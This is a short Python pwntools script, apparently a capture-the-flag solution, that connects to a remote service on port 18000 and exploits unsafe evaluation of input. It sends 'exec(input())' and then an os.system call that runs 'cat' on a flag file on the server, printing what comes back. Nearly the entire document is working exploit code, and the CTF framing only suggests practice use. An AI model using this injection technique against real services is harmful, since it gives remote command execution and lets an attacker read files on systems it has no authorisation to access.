#!/usr/bin/env python3

from pwn import *

host = sys.argv[1]
port = 18000
p = remote(host,port)
p.sendline(b'exec(input())')
p.sendline(b'__import__("os").system("cat /home/linz/Desktop/Server/flag.txt")')
print(p.recv(),flush=True)
print(p.recv(),flush=True)
p.close()